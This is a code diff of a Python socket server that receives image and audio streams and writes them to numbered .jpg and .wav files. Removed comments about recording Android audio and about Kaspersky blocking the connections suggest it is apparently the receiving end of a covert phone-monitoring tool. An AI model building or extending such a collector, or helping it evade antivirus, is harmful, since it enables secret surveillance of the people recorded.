@@ -3,9 +3,6 @@ from socketserver import StreamRequestHandler
 from traceback import format_tb
 import wave
 
-import numpy as np
-import soundfile as sf
-
 
 class ImageHandler(StreamRequestHandler):
     def handle(self):
@@ -19,7 +16,7 @@ class ImageHandler(StreamRequestHandler):
                 if not package: break
                 data += package
             global dTemp, iTime
-            with open(os.path.join(dTemp, str(iTime) + ".jpg"), "wb") as f:
+            with open(os.path.join(dTemp, str(iTime) + pExt), "wb") as f:
                 f.write(data)
             iTime += 1
         except Exception as e:
@@ -37,26 +34,16 @@ class AudioHandler(StreamRequestHandler):
                 package = self.request.recv(1073741824)
                 if not package: break
                 data += package
-            global audio, sample_rate, aTime, dTemp
-            #with open(os.path.join(dTemp, aTemp), "ab") as f:
-            #    f.write(data)
-
+            global sample_rate, aTime, dTemp
             last_time = str(aTime)
-            fTemp = os.path.join(dTemp, last_time + ".wav")
+            fTemp = os.path.join(dTemp, last_time + aExt)
             with wave.open(fTemp, 'wb') as f:
-                f.setparams((1, 2, 44100, 0, 'NONE', 'NONE'))
+                f.setparams((1, 2, sample_rate, 0, 'NONE', 'NONE'))
                 f.writeframes(data)
-            #with sf.SoundFile(os.path.join(dTemp, last_time + ".m4a"), 'w+', 44100, 1, 'PCM_16') as f:
-            #    f.buffer_write(data, )
-            #arr, sample_rate = sf.read(fTemp)
-            #audio = np.concatenate((audio, arr)) if audio is not None else arr
-            #del arr
-            #os.remove(wTemp)
             aTime += 1
         except Exception as e:
             print(str(e.__class__)[8:-2] + ": " + str(e) + "\n" + ''.join(format_tb(e.__traceback__)))
 
-# TODO: In Android, record audio in 5 seconds audio files.
 
 def root():
     r = os.path.dirname(__file__)
@@ -70,8 +57,4 @@ def root():
 
 iTime = aTime = 0
 dTemp = os.path.join(root(), "mem", "tmp")
-aTemp = "audio.wav"
-audio = None
-sample_rate = 0
-
-# Kaspersky will try to block these connections!
+sample_rate, aExt, pExt = 44100, ".wav", ".jpg"
